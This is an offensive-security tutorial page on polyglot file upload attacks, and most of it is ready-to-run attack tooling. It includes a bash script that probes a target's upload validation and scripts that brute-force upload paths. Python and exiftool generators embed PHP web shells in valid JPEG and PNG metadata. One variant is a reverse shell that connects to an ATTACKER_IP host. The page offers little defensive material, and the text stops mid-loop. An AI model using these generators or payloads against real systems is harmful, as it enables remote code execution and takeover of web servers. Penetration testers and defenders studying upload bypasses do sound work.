---
title: Polyglot File Upload
description: Polyglot File Upload — Craft Files Valid in Multiple Formats to Bypass All Validation Layers
navigation:
  icon: i-lucide-file-stack
  title: Polyglot File Upload
---

## Polyglot File Upload

::badge
**Critical Severity — CWE-434 / CWE-436 / CWE-345**
::

::note
A **polyglot file** is a single file that is simultaneously valid in two or more file formats. In file upload exploitation, polyglots are crafted to pass every validation layer — magic bytes, file parsing, re-encoding, MIME detection, and extension checks — because the file genuinely **is** a valid image/document. However, it also contains executable code (PHP, JSP, ASP, JavaScript) that the web server interprets when accessed. Polyglot attacks represent the most advanced file upload bypass technique and defeat defenses that simple magic byte prepending cannot.
::

---

## Vulnerability Anatomy

::accordion
  :::accordion-item{icon="i-lucide-layers" label="What Makes Polyglots Different from Magic Byte Forgery"}
  | Technique | File Validity | Survives Parsing | Survives Re-encoding | Bypass Level |
  | --------- | ------------- | ---------------- | -------------------- | ------------ |
  | Extension rename | ✗ Not valid image | ✗ | ✗ | Trivial |
  | Content-Type spoof | ✗ Not valid image | ✗ | ✗ | Trivial |
  | Magic byte prepend | ✓ Header looks valid | ✗ Fails full parse | ✗ | Moderate |
  | EXIF metadata injection | ✓ Valid image | ✓ Passes parsing | ~ Sometimes survives | High |
  | **Polyglot file** | **✓ Fully valid in both formats** | **✓ Passes all parsing** | **✓ Can survive** | **Advanced** |

  **Key distinction:** A polyglot isn't pretending to be an image — it genuinely **is** a valid image that also happens to contain executable code in locations that survive image processing. When the web server serves it with a PHP/JSP handler, the interpreter finds and executes the embedded code while ignoring the binary image data.
  :::

  :::accordion-item{icon="i-lucide-cpu" label="How Polyglot Exploitation Works"}
  1. Attacker crafts a file that passes `file` command, `getimagesize()`, `imagecreatefromjpeg()`, and all validation
  2. The file contains executable code hidden in metadata fields, pixel data, ancillary chunks, or comment segments
  3. File is uploaded and stored on the server with an executable extension or in a directory with handler overrides
  4. Web server processes the file through the language interpreter (PHP, Java, ASP.NET)
  5. The interpreter ignores binary image data but finds and executes `<?php ... ?>` or `<% ... %>` tags
  6. Full Remote Code Execution achieved through a file that is genuinely a valid image
  :::

  :::accordion-item{icon="i-lucide-target" label="Attack Surface"}
  - **Image upload endpoints** — Avatars, profile photos, product images, thumbnails
  - **Document upload** — Resume parsers, invoice processors, report generators
  - **Theme/plugin upload** — CMS platforms accepting ZIP/archive uploads
  - **Import/export** — CSV, XML, JSON importers that accept file uploads
  - **Rich text editors** — CKEditor, TinyMCE, Froala with image upload
  - **API file endpoints** — REST/GraphQL file upload mutations
  - **Email attachments** — Webmail attachment processing
  - **Cloud storage** — S3 presigned uploads, Azure Blob, GCS
  - **CDN origin** — Files served through CDN with origin processing
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="Impact Scenarios"}
  | Impact | Chain | Severity |
  | ------ | ----- | -------- |
  | **Remote Code Execution** | Polyglot image executes as PHP/JSP/ASPX | Critical |
  | **Stored XSS** | SVG/HTML polyglot renders JavaScript in victim browser | High |
  | **SSRF** | SVG/XML polyglot with external entity references | High |
  | **XXE** | DOCX/XLSX polyglot with DTD injection | High |
  | **Local File Inclusion** | Polyglot included by application code | Critical |
  | **Deserialization RCE** | PHAR polyglot triggers `phar://` deserialization | Critical |
  | **WAF Bypass** | Polyglot smuggles payloads past content inspection | High |
  | **Prototype Pollution** | JSON polyglot via document upload | Medium |
  | **Server-side Template Injection** | Polyglot with SSTI payload in metadata | High |
  :::
::

---

## Polyglot Format Combinations

::tip
Each polyglot type exploits specific characteristics of how file formats store data. Understanding the structure of each format is essential for crafting reliable polyglots.
::

### Format Compatibility Matrix

::collapsible

| Polyglot Type | Image Valid | Code Execution | Survives Re-encode | Difficulty | Best For |
| ------------- | ----------- | -------------- | ------------------- | ---------- | -------- |
| GIF + PHP | ✓ Full GIF | PHP via comment block | ✗ Stripped | Easy | Quick bypass |
| JPEG + PHP (COM segment) | ✓ Full JPEG | PHP in comment segment | ~ Partial | Moderate | Most targets |
| JPEG + PHP (EXIF) | ✓ Full JPEG | PHP in EXIF fields | ~ Some survive | Moderate | EXIF-preserving targets |
| PNG + PHP (tEXt) | ✓ Full PNG | PHP in text chunk | ~ Partial | Moderate | Metadata-preserving targets |
| PNG + PHP (IDAT) | ✓ Full PNG | PHP in pixel data | ✓ Survives | Hard | Re-encoding targets |
| PNG + PHP (PLTE) | ✓ Full PNG | PHP in palette data | ✓ Can survive | Hard | GD library targets |
| BMP + PHP | ✓ Full BMP | PHP after header | ✗ Stripped | Easy | Basic validation |
| SVG + JS/XSS | ✓ Valid SVG | JavaScript execution | N/A (text format) | Easy | XSS / SSRF |
| PDF + JS | ✓ Valid PDF | JavaScript in PDF | N/A | Moderate | Client-side attacks |
| PHAR + JPEG | ✓ Valid JPEG | PHP via phar:// | ✓ Survives | Hard | Deserialization chains |
| JPEG + HTML | ✓ Valid JPEG | HTML/JS in browser | N/A | Easy | Content-sniffing XSS |
| ZIP + JPEG | ✓ Valid JPEG | Code in ZIP structure | N/A | Moderate | Archive handlers |
| GIF + JS | ✓ Valid GIF | JavaScript via content-type mismatch | N/A | Easy | Content-sniffing XSS |
| ICO + PHP | ✓ Valid ICO | PHP in ICO data | ✗ | Easy | Favicon upload |
| WEBP + PHP | ✓ Valid WEBP | PHP in metadata | ~ | Moderate | Modern image handlers |

::

---

## Reconnaissance & Validation Fingerprinting

### Systematic Validation Detection

::tabs
  :::tabs-item{icon="i-lucide-microscope" label="Layered Validation Detection"}
  ```bash
  #!/bin/bash
  # polyglot_recon.sh — Systematically detect all validation layers

  UPLOAD_URL="$1"       # https://target.com/api/upload
  COOKIE="$2"           # session=AUTH_TOKEN
  FIELD="${3:-file}"     # form field name

  if [ -z "$UPLOAD_URL" ]; then
      echo "Usage: $0 <upload_url> <cookie> [field_name]"
      exit 1
  fi

  echo "═══════════════════════════════════════════"
  echo " Polyglot Upload Validation Fingerprinter"
  echo "═══════════════════════════════════════════"
  echo "[*] Target: $UPLOAD_URL"
  echo "[*] Field: $FIELD"
  echo ""

  upload_test() {
      local desc="$1"
      local file="$2"
      local filename="$3"
      local ct="$4"
      local status

      status=$(curl -s -o /tmp/polyglot_resp_$$.txt -w "%{http_code}" \
        -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@${file};filename=${filename};type=${ct}" \
        -H "Cookie: $COOKIE" 2>/dev/null)

      local resp_body=$(cat /tmp/polyglot_resp_$$.txt 2>/dev/null)
      local success="BLOCKED"
      if [ "$status" = "200" ] || [ "$status" = "201" ]; then
          echo "$resp_body" | grep -qiE "success|upload|saved|created|url|path|file" && success="ACCEPTED"
      fi

      printf "  [%-8s] [%s] %s\n" "$success" "$status" "$desc"
      echo "$desc|$success|$status" >> /tmp/polyglot_results_$$.txt
  }

  # ── Generate test files ──
  echo '<?php echo "TEST"; ?>' > /tmp/pt_raw_php.php
  echo 'test content' > /tmp/pt_text.txt
  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > /tmp/pt_jpghdr.bin
  echo '<?php echo "TEST"; ?>' >> /tmp/pt_jpghdr.bin
  echo -n 'GIF89a<?php echo "TEST"; ?>' > /tmp/pt_gifphp.bin

  # Valid 1x1 JPEG
  python3 -c "
  from PIL import Image
  import io
  img = Image.new('RGB', (1,1), 'white')
  img.save('/tmp/pt_valid.jpg', 'JPEG', quality=95)
  img.save('/tmp/pt_valid.png', 'PNG')
  img.save('/tmp/pt_valid.gif', 'GIF')
  img.save('/tmp/pt_valid.bmp', 'BMP')
  " 2>/dev/null || {
      # Fallback without Pillow
      printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/pt_valid.jpg
      printf '\x89PNG\r\n\x1a\n' > /tmp/pt_valid.png
      echo -n 'GIF89a' > /tmp/pt_valid.gif
      printf 'BM' > /tmp/pt_valid.bmp
  }

  # JPEG with PHP in EXIF comment
  python3 -c "
  import struct
  data = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
  php = b'<?php echo \"TEST\"; ?>'
  data += b'\xff\xfe' + struct.pack('>H', len(php)+2) + php
  data += b'\xff\xd9'
  open('/tmp/pt_jpg_com.bin','wb').write(data)
  " 2>/dev/null

  echo "─── Layer 1: Extension Validation ───"
  upload_test "Raw PHP (.php)"                    /tmp/pt_raw_php.php    "test.php"    "application/x-php"
  upload_test "Raw PHP (.phtml)"                  /tmp/pt_raw_php.php    "test.phtml"  "application/x-php"
  upload_test "Raw PHP (.php5)"                   /tmp/pt_raw_php.php    "test.php5"   "application/x-php"
  upload_test "Raw PHP (.pHp)"                    /tmp/pt_raw_php.php    "test.pHp"    "application/x-php"
  upload_test "Text (.txt)"                       /tmp/pt_text.txt       "test.txt"    "text/plain"
  upload_test "Valid JPEG (.jpg)"                 /tmp/pt_valid.jpg      "test.jpg"    "image/jpeg"
  upload_test "Valid PNG (.png)"                   /tmp/pt_valid.png      "test.png"    "image/png"
  upload_test "Double ext (.php.jpg)"             /tmp/pt_raw_php.php    "test.php.jpg" "image/jpeg"
  upload_test "Double ext (.jpg.php)"             /tmp/pt_raw_php.php    "test.jpg.php" "image/jpeg"

  echo ""
  echo "─── Layer 2: Content-Type Validation ───"
  upload_test "PHP + CT:image/jpeg (.php)"        /tmp/pt_raw_php.php    "test.php"    "image/jpeg"
  upload_test "PHP + CT:image/png (.php)"         /tmp/pt_raw_php.php    "test.php"    "image/png"
  upload_test "PHP + CT:image/gif (.php)"         /tmp/pt_raw_php.php    "test.php"    "image/gif"
  upload_test "PHP + CT:octet-stream (.php)"      /tmp/pt_raw_php.php    "test.php"    "application/octet-stream"

  echo ""
  echo "─── Layer 3: Magic Byte Validation ───"
  upload_test "JPEG magic + PHP (.jpg)"           /tmp/pt_jpghdr.bin     "test.jpg"    "image/jpeg"
  upload_test "JPEG magic + PHP (.php)"           /tmp/pt_jpghdr.bin     "test.php"    "image/jpeg"
  upload_test "GIF magic + PHP (.gif)"            /tmp/pt_gifphp.bin     "test.gif"    "image/gif"
  upload_test "GIF magic + PHP (.php)"            /tmp/pt_gifphp.bin     "test.php"    "image/gif"

  echo ""
  echo "─── Layer 4: Full Image Parsing ───"
  upload_test "Valid JPEG + PHP in COM (.jpg)"    /tmp/pt_jpg_com.bin    "test.jpg"    "image/jpeg"
  upload_test "Valid JPEG + PHP in COM (.php)"    /tmp/pt_jpg_com.bin    "test.php"    "image/jpeg"
  upload_test "Valid JPEG + PHP in COM (.php.jpg)" /tmp/pt_jpg_com.bin   "test.php.jpg" "image/jpeg"

  echo ""
  echo "─── Layer 5: Re-encoding Detection ───"
  # Upload valid image and download to compare
  UPLOAD_RESP=$(curl -s -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/pt_valid.jpg;filename=reenc_test.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE" 2>/dev/null)
  UPLOADED_URL=$(echo "$UPLOAD_RESP" | grep -oP '"url"\s*:\s*"[^"]*"' | grep -oP 'https?://[^"]*' | head -1)
  if [ -n "$UPLOADED_URL" ]; then
      curl -s "$UPLOADED_URL" -o /tmp/pt_downloaded.jpg 2>/dev/null
      ORIG_SIZE=$(wc -c < /tmp/pt_valid.jpg)
      DOWN_SIZE=$(wc -c < /tmp/pt_downloaded.jpg 2>/dev/null || echo 0)
      if [ "$ORIG_SIZE" != "$DOWN_SIZE" ]; then
          echo "  [RE-ENCODE] Image was re-processed (${ORIG_SIZE} → ${DOWN_SIZE} bytes)"
          echo "  [*] Need IDAT/PLTE polyglot to survive re-encoding"
      else
          echo "  [PRESERVE]  Image preserved as-is (${ORIG_SIZE} bytes)"
          echo "  [*] EXIF/comment polyglots should work"
      fi
  else
      echo "  [UNKNOWN]   Could not determine re-encoding behavior"
  fi

  echo ""
  echo "═══ Summary ═══"
  ACCEPTED=$(grep -c "ACCEPTED" /tmp/polyglot_results_$$.txt 2>/dev/null || echo 0)
  TOTAL=$(wc -l < /tmp/polyglot_results_$$.txt 2>/dev/null || echo 0)
  echo "[*] ${ACCEPTED}/${TOTAL} test cases accepted"
  echo "[*] Accepted uploads:"
  grep "ACCEPTED" /tmp/polyglot_results_$$.txt 2>/dev/null | cut -d'|' -f1 | sed 's/^/    ✓ /'

  # Cleanup
  rm -f /tmp/pt_* /tmp/polyglot_resp_$$.txt /tmp/polyglot_results_$$.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Technology-Specific Detection"}
  ```bash
  # ── Identify image processing library in use ──
  # This determines which polyglot technique will work

  # PHP: GD Library vs ImageMagick
  curl -s "https://target.com/phpinfo.php" | grep -iE "gd|imagick|imagemagick"
  # GD Library: imagecreatefromjpeg(), imagejpeg() — strips most metadata
  # ImageMagick: May preserve more metadata, but has its own vulnerabilities

  # Check via error messages
  curl -s "https://target.com/api/upload" \
    -F "file=@/dev/null;filename=test.jpg;type=image/jpeg" \
    -H "Cookie: session=TOKEN" 2>&1 | grep -iE "gd|imagick|imagemagick|pillow|sharp|jimp|vips"

  # Node.js: Sharp vs Jimp vs GM
  curl -s "https://target.com/package.json" 2>/dev/null | grep -iE "sharp|jimp|gm|imagemagick|canvas"

  # Python: Pillow vs cv2 vs wand
  curl -s "https://target.com/requirements.txt" 2>/dev/null | grep -iE "pillow|opencv|wand|imageio"

  # Java: ImageIO vs Thumbnailator
  # Check response headers for Java server
  curl -sI https://target.com | grep -iE "server|x-powered"

  # Fingerprint via upload error detail level
  # Upload a truncated JPEG (corrupt)
  printf '\xFF\xD8\xFF\xE0\x00' > /tmp/truncated.jpg
  curl -s -X POST "https://target.com/api/upload" \
    -F "file=@/tmp/truncated.jpg;filename=test.jpg;type=image/jpeg" \
    -H "Cookie: session=TOKEN" | tee /tmp/error_response.txt

  # Error messages reveal library:
  # "imagecreatefromjpeg(): ... is not a valid JPEG" → PHP GD
  # "MagickReadImage ... corrupt JPEG" → ImageMagick
  # "Input file is missing or of an unsupported image format" → Sharp
  # "PIL.UnidentifiedImageError" → Python Pillow
  # "javax.imageio.IIOException" → Java ImageIO

  rm -f /tmp/truncated.jpg /tmp/error_response.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-radar" label="Upload Path Discovery"}
  ```bash
  # ── Find where uploaded files are stored ──

  TARGET="https://target.com"
  COOKIE="session=TOKEN"

  # Upload a unique identifiable image
  MARKER="POLYGLOT_MARKER_$(date +%s)"
  python3 -c "
  from PIL import Image
  img = Image.new('RGB', (1,1), (255,0,0))
  img.save('/tmp/marker.jpg', 'JPEG', quality=95)
  " 2>/dev/null || printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00' > /tmp/marker.jpg

  # Upload and capture response
  RESP=$(curl -s -X POST "${TARGET}/api/upload" \
    -F "file=@/tmp/marker.jpg;filename=${MARKER}.jpg" \
    -H "Cookie: $COOKIE")

  echo "[*] Upload response:"
  echo "$RESP" | python3 -m json.tool 2>/dev/null || echo "$RESP"

  # Extract URL patterns from response
  echo "$RESP" | grep -oP '(https?://[^\s"]+\.(jpg|jpeg|png|gif|php)[^\s"]*)'
  echo "$RESP" | grep -oP '"(url|path|file|location|src|href)"\s*:\s*"([^"]*)"'

  # Brute force common upload directories
  for dir in uploads images media files static assets content \
             user-content user-uploads avatars profile-images \
             tmp temp upload img data public storage \
             wp-content/uploads sites/default/files \
             application/uploads public/uploads; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/${dir}/${MARKER}.jpg")
      [ "$STATUS" != "404" ] && echo "[${STATUS}] ${TARGET}/${dir}/${MARKER}.jpg"
  done

  rm -f /tmp/marker.jpg
  ```
  :::
::

---

## JPEG Polyglots

::warning
JPEG is the most commonly accepted image format and offers multiple injection points: COM (comment) segments, EXIF APP1 data, XMP APP1 data, ICC APP2 profiles, and custom APP markers. Each survives different processing pipelines.
::

### JPEG + PHP Polyglot

::tabs
  :::tabs-item{icon="i-lucide-image" label="COM Segment Injection"}
  ```python [jpeg_com_polyglot.py]
  #!/usr/bin/env python3
  """
  JPEG/PHP polyglot via COM (Comment) segment
  The file is a fully valid JPEG that contains PHP in the COM marker.
  PHP ignores binary data between ?> and <?php tags.
  """
  import struct
  from PIL import Image
  import io

  def create_jpeg_com_polyglot(output_path, php_code, width=100, height=100):
      """Create valid JPEG with PHP payload in COM segment"""

      # Create a genuine JPEG image
      img = Image.new('RGB', (width, height), color=(255, 255, 255))
      # Draw something to make it look legitimate
      pixels = img.load()
      for x in range(width):
          for y in range(height):
              pixels[x, y] = ((x * 7) % 256, (y * 13) % 256, ((x + y) * 3) % 256)

      # Save to buffer to get valid JPEG data
      buf = io.BytesIO()
      img.save(buf, 'JPEG', quality=95, subsampling=0)
      jpeg_data = buf.getvalue()

      # Parse JPEG structure and inject COM segment after APP0
      payload = php_code.encode() if isinstance(php_code, str) else php_code

      # JPEG structure: SOI (FF D8) + segments + SOS + data + EOI (FF D9)
      # Insert COM segment (FF FE) right after SOI + APP0

      soi = jpeg_data[:2]  # FF D8
      rest = jpeg_data[2:]

      # Find end of first APP marker
      pos = 0
      if rest[0:2] == b'\xff\xe0':  # APP0 (JFIF)
          app0_len = struct.unpack('>H', rest[2:4])[0]
          pos = 2 + app0_len

      # Create COM segment
      com_data = payload
      com_segment = b'\xff\xfe' + struct.pack('>H', len(com_data) + 2) + com_data

      # Reassemble: SOI + APP0 + COM(payload) + rest
      polyglot = soi + rest[:pos] + com_segment + rest[pos:]

      with open(output_path, 'wb') as f:
          f.write(polyglot)

      # Verify it's valid
      try:
          verify = Image.open(output_path)
          verify.verify()
          print(f"[+] {output_path} — Valid JPEG ✓ ({len(polyglot)} bytes, {width}x{height})")
      except Exception as e:
          print(f"[!] {output_path} — Validation warning: {e}")

      return polyglot

  # ── Generate polyglot variants ──
  shells = {
      "jpeg_poly_system.php.jpg": '<?php system($_GET["cmd"]); ?>',
      "jpeg_poly_eval.php.jpg": '<?php eval($_POST["e"]); ?>',
      "jpeg_poly_exec.php.jpg": '<?php echo "<pre>".shell_exec($_REQUEST["cmd"])."</pre>"; ?>',
      "jpeg_poly_minimal.php.jpg": '<?=`$_GET[c]`?>',
      "jpeg_poly_base64.php.jpg": '<?php eval(base64_decode($_POST["e"])); ?>',
      "jpeg_poly_passthru.php.jpg": '<?php passthru($_GET["cmd"]); ?>',
      "jpeg_poly_assert.php.jpg": '<?php @assert($_REQUEST["cmd"]); ?>',
      "jpeg_poly_preg.php.jpg": '<?php preg_replace("/.*/e",$_POST["e"],""); ?>',
      "jpeg_poly_file_read.php.jpg": '<?php highlight_file($_GET["f"]); ?>',
      "jpeg_poly_info.php.jpg": '<?php phpinfo(); ?>',
      "jpeg_poly_reverse.php.jpg": '<?php $s=fsockopen("ATTACKER_IP",4444);$p=proc_open("/bin/bash -i",array(0=>$s,1=>$s,2=>$s),$x); ?>',
  }

  for filename, shell in shells.items():
      create_jpeg_com_polyglot(filename, shell)

  print(f"\n[+] Generated {len(shells)} JPEG/PHP polyglots")
  ```
  :::

  :::tabs-item{icon="i-lucide-image" label="EXIF Polyglot"}
  ```python [jpeg_exif_polyglot.py]
  #!/usr/bin/env python3
  """
  JPEG/PHP polyglot via EXIF metadata fields
  Payload is stored in EXIF data that some image processors preserve.
  Multiple EXIF fields are injected as redundancy.
  """
  from PIL import Image
  import io
  import struct
  import os

  def create_exif_polyglot(output_path, php_code):
      """Inject PHP into multiple EXIF fields of a valid JPEG"""

      payload = php_code.encode() if isinstance(php_code, str) else php_code

      # Create genuine image
      img = Image.new('RGB', (100, 100), color='red')
      buf = io.BytesIO()
      img.save(buf, 'JPEG', quality=95)
      jpeg_data = buf.getvalue()

      # Build custom EXIF APP1 segment with payload in multiple IFD entries
      # EXIF structure: APP1 marker + Exif header + TIFF header + IFD entries

      exif_header = b'Exif\x00\x00'
      tiff_header = b'II'  # Little-endian
      tiff_header += b'\x2a\x00'  # TIFF magic
      tiff_header += struct.pack('<I', 8)  # Offset to first IFD

      # IFD entries
      entries = []

      # Tag 0x010E — ImageDescription
      entries.append((0x010E, 2, payload))  # ASCII type

      # Tag 0x013B — Artist
      entries.append((0x013B, 2, payload))

      # Tag 0x8298 — Copyright
      entries.append((0x8298, 2, payload))

      # Tag 0x010F — Make
      entries.append((0x010F, 2, b'<?php system($_GET["cmd"]); ?>'))

      # Tag 0x0110 — Model
      entries.append((0x0110, 2, b'<?php eval($_POST["e"]); ?>'))

      # Build IFD
      ifd_count = struct.pack('<H', len(entries))
      ifd_data = b''
      value_data = b''
      value_offset = 10 + 2 + len(entries) * 12 + 4  # After IFD structure

      for tag, dtype, value in entries:
          count = len(value) + 1  # Include null terminator for ASCII
          value_with_null = value + b'\x00'

          if count <= 4:
              # Value fits in offset field
              padded = value_with_null.ljust(4, b'\x00')
              ifd_data += struct.pack('<HHII', tag, dtype, count, 0)
              ifd_data = ifd_data[:-4] + padded
          else:
              # Value stored after IFD
              ifd_data += struct.pack('<HHI', tag, dtype, count)
              ifd_data += struct.pack('<I', value_offset + len(value_data))
              value_data += value_with_null

      ifd_next = struct.pack('<I', 0)  # No next IFD

      exif_body = tiff_header + ifd_count + ifd_data + ifd_next + value_data
      app1_data = exif_header + exif_body
      app1_segment = b'\xff\xe1' + struct.pack('>H', len(app1_data) + 2) + app1_data

      # Insert APP1 segment into JPEG
      soi = jpeg_data[:2]
      rest = jpeg_data[2:]

      # Skip existing APP0 if present
      pos = 0
      if rest[0:2] == b'\xff\xe0':
          app0_len = struct.unpack('>H', rest[2:4])[0]
          pos = 2 + app0_len

      polyglot = soi + rest[:pos] + app1_segment + rest[pos:]

      with open(output_path, 'wb') as f:
          f.write(polyglot)

      print(f"[+] {output_path} — EXIF polyglot ({len(polyglot)} bytes)")
      return polyglot

  create_exif_polyglot("exif_poly_system.php.jpg", b'<?php system($_GET["cmd"]); ?>')
  create_exif_polyglot("exif_poly_eval.php.jpg", b'<?php eval($_POST["e"]); ?>')
  create_exif_polyglot("exif_poly_exec.php.jpg", b'<?php echo shell_exec($_GET["cmd"]); ?>')
  ```
  :::

  :::tabs-item{icon="i-lucide-image" label="ExifTool Quick Craft"}
  ```bash
  # ── Quick EXIF polyglot creation with exiftool ──

  # Step 1: Create a genuine valid JPEG image
  python3 -c "
  from PIL import Image
  img = Image.new('RGB', (200, 200), 'blue')
  for x in range(200):
      for y in range(200):
          img.putpixel((x,y), ((x*3)%256, (y*7)%256, ((x+y)*5)%256))
  img.save('base_image.jpg', 'JPEG', quality=95)
  " 2>/dev/null || convert -size 200x200 plasma: base_image.jpg

  # Step 2: Inject PHP into ALL metadata fields
  exiftool \
    -Comment='<?php system($_GET["cmd"]); ?>' \
    -ImageDescription='<?php eval($_POST["e"]); ?>' \
    -Artist='<?=`$_GET[c]`?>' \
    -Copyright='<?php passthru($_GET["cmd"]); ?>' \
    -UserComment='<?php echo shell_exec($_REQUEST["cmd"]); ?>' \
    -DocumentName='<?php highlight_file($_GET["f"]); ?>' \
    -Make='<?php readfile($_GET["f"]); ?>' \
    -Model='<?php file_put_contents("s.php",base64_decode($_POST["d"])); ?>' \
    -Software='<?php phpinfo(); ?>' \
    -XPComment='<?php system($_GET["cmd"]); ?>' \
    -XPTitle='<?php eval($_POST["e"]); ?>' \
    -XPAuthor='<?php passthru($_GET["cmd"]); ?>' \
    -XPSubject='<?=`$_GET[c]`?>' \
    -overwrite_original \
    base_image.jpg

  # Step 3: Create copies with different extensions
  cp base_image.jpg polyglot_exiftool.php.jpg
  cp base_image.jpg polyglot_exiftool.phtml.jpg
  cp base_image.jpg polyglot_exiftool.php5.jpg
  cp base_image.jpg polyglot_exiftool.jpg.php

  # Step 4: Verify image is still valid
  file base_image.jpg
  python3 -c "from PIL import Image; Image.open('base_image.jpg').verify(); print('[+] Valid JPEG')"
  identify base_image.jpg 2>/dev/null

  # Step 5: Verify PHP code is embedded
  strings base_image.jpg | grep -c "php"
  exiftool base_image.jpg | grep -i "comment\|description\|artist\|copyright"

  # ── Inject into PNG ──
  python3 -c "from PIL import Image; Image.new('RGB',(100,100),'green').save('base.png')" 2>/dev/null
  exiftool -Comment='<?php system($_GET["cmd"]); ?>' -overwrite_original base.png
  cp base.png polyglot_png.php.png

  # ── Inject into GIF ──
  python3 -c "from PIL import Image; Image.new('RGB',(100,100),'yellow').save('base.gif')" 2>/dev/null
  exiftool -Comment='<?php system($_GET["cmd"]); ?>' -overwrite_original base.gif
  cp base.gif polyglot_gif.php.gif

  echo "[+] All exiftool polyglots generated"
  ls -la polyglot_*
  ```
  :::

  :::tabs-item{icon="i-lucide-image" label="XMP Metadata Polyglot"}
  ```python [jpeg_xmp_polyglot.py]
  #!/usr/bin/env python3
  """
  JPEG/PHP polyglot via XMP metadata.
  XMP is XML-based and often preserved by image processors.
  PHP code is embedded within XML attributes/text.
  """
  from PIL import Image
  import struct
  import io

  def create_xmp_polyglot(output_path, php_code):
      """Embed PHP in XMP metadata of valid JPEG"""

      # Create valid image
      img = Image.new('RGB', (100, 100), color=(0, 128, 255))
      buf = io.BytesIO()
      img.save(buf, 'JPEG', quality=95)
      jpeg_data = buf.getvalue()

      # XMP data with PHP payload hidden in dc:description
      xmp_data = f'''<?xpacket begin="\xef\xbb\xbf" id="W5M0MpCehiHzreSzNTczkc9d"?>
  <x:xmpmeta xmlns:x="adobe:ns:meta/">
  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
  <rdf:Description rdf:about=""
    xmlns:dc="http://purl.org/dc/elements/1.1/"
    xmlns:xmp="http://ns.adobe.com/xap/1.0/"
    xmlns:photoshop="http://ns.adobe.com/photoshop/1.0/">
  <dc:description>
    <rdf:Alt>
      <rdf:li xml:lang="x-default">{php_code}</rdf:li>
    </rdf:Alt>
  </dc:description>
  <dc:creator>
    <rdf:Seq>
      <rdf:li>{php_code}</rdf:li>
    </rdf:Seq>
  </dc:creator>
  <dc:rights>
    <rdf:Alt>
      <rdf:li xml:lang="x-default">{php_code}</rdf:li>
    </rdf:Alt>
  </dc:rights>
  <xmp:CreatorTool>{php_code}</xmp:CreatorTool>
  <photoshop:Instructions>{php_code}</photoshop:Instructions>
  </rdf:Description>
  </rdf:RDF>
  </x:xmpmeta>
  <?xpacket end="w"?>'''.encode()

      # Create APP1 segment with XMP namespace
      xmp_ns = b'http://ns.adobe.com/xap/1.0/\x00'
      app1_data = xmp_ns + xmp_data
      app1_segment = b'\xff\xe1' + struct.pack('>H', len(app1_data) + 2) + app1_data

      # Insert into JPEG after SOI
      soi = jpeg_data[:2]
      rest = jpeg_data[2:]
      pos = 0
      if rest[0:2] == b'\xff\xe0':
          app0_len = struct.unpack('>H', rest[2:4])[0]
          pos = 2 + app0_len

      polyglot = soi + rest[:pos] + app1_segment + rest[pos:]

      with open(output_path, 'wb') as f:
          f.write(polyglot)

      print(f"[+] {output_path} — XMP polyglot ({len(polyglot)} bytes)")

  create_xmp_polyglot("xmp_poly.php.jpg", '<?php system($_GET["cmd"]); ?>')
  create_xmp_polyglot("xmp_poly_eval.php.jpg", '<?php eval($_POST["e"]); ?>')
  ```
  :::
::

---

## PNG Polyglots

### PNG + PHP via Ancillary Chunks

::tabs
  :::tabs-item{icon="i-lucide-file-image" label="tEXt / zTXt / iTXt Chunks"}
  ```python [png_text_polyglot.py]
  #!/usr/bin/env python3
  """
  PNG/PHP polyglot using ancillary text chunks.
  PNG spec defines tEXt, zTXt, and iTXt as optional metadata chunks.
  Many image processors preserve these chunks during processing.
  """
  import struct
  import zlib
  from PIL import Image
  import io

  def png_chunk(chunk_type, data):
      """Create properly formatted PNG chunk with CRC"""
      raw = chunk_type + data
      return struct.pack('>I', len(data)) + raw + struct.pack('>I', zlib.crc32(raw) & 0xffffffff)

  def create_png_text_polyglot(output_path, php_code, width=100, height=100):
      """Create valid PNG with PHP in text chunks"""

      # Generate valid PNG from Pillow
      img = Image.new('RGBA', (width, height), (255, 0, 0, 255))
      pixels = img.load()
      for x in range(width):
          for y in range(height):
              pixels[x, y] = ((x * 5) % 256, (y * 11) % 256, ((x + y) * 7) % 256, 255)

      buf = io.BytesIO()
      img.save(buf, 'PNG')
      png_data = buf.getvalue()

      payload = php_code.encode() if isinstance(php_code, str) else php_code

      # Parse PNG: signature + chunks
      signature = png_data[:8]  # \x89PNG\r\n\x1a\n

      # Find IEND position
      iend_pos = png_data.rfind(b'IEND') - 4  # 4 bytes for length field

      # Create text chunks with payload
      text_chunk = png_chunk(b'tEXt', b'Comment\x00' + payload)
      text_chunk2 = png_chunk(b'tEXt', b'Description\x00' + payload)
      text_chunk3 = png_chunk(b'tEXt', b'Author\x00' + payload)

      # zTXt (compressed text) — may survive more processors
      ztxt_data = b'Software\x00\x00' + zlib.compress(payload)
      ztxt_chunk = png_chunk(b'zTXt', ztxt_data)

      # iTXt (international text) — most flexible
      itxt_data = b'XML:com.adobe.xmp\x00\x00\x00\x00\x00' + payload
      itxt_chunk = png_chunk(b'iTXt', itxt_data)

      # Insert all text chunks before IEND
      polyglot = png_data[:iend_pos] + text_chunk + text_chunk2 + text_chunk3 + ztxt_chunk + itxt_chunk + png_data[iend_pos:]

      with open(output_path, 'wb') as f:
          f.write(polyglot)

      # Verify
      try:
          verify_img = Image.open(output_path)
          verify_img.verify()
          print(f"[+] {output_path} — Valid PNG ✓ ({len(polyglot)} bytes)")
      except Exception as e:
          print(f"[!] {output_path} — Warning: {e}")

      return polyglot

  shells = {
      "png_text_system.php.png": '<?php system($_GET["cmd"]); ?>',
      "png_text_eval.php.png": '<?php eval($_POST["e"]); ?>',
      "png_text_exec.php.png": '<?php echo shell_exec($_REQUEST["cmd"]); ?>',
      "png_text_minimal.php.png": '<?=`$_GET[c]`?>',
  }

  for filename, shell in shells.items():
